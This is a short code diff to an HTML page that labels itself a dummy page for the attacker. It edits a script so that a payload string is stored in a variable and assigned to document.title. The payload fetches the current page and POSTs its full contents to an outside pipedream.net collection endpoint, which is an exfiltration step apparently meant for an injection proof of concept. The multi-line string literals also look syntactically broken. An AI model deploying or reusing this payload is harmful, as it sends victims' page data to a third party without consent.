@@ -8,9 +8,11 @@
   <p>This page acts as a dummy page for the attacker.</p>
 </body>
 <script defer>
-  document.title = "<script>
-    fetch(window.location.href)
+  // Escape the script as a string
+  var script = "fetch(window.location.href)
     .then(response => response.text())
-    .then(responseText => fetch('https://eok0h61dts3i7c3.m.pipedream.net', { method: 'POST', body: responseText }));</script>";
+    .then(responseText => fetch('https://eok0h61dts3i7c3.m.pipedream.net', { method: 'POST', body: responseText }));";
+  // Assign the script to document.title
+  document.title = script;
 </script>
 </html>
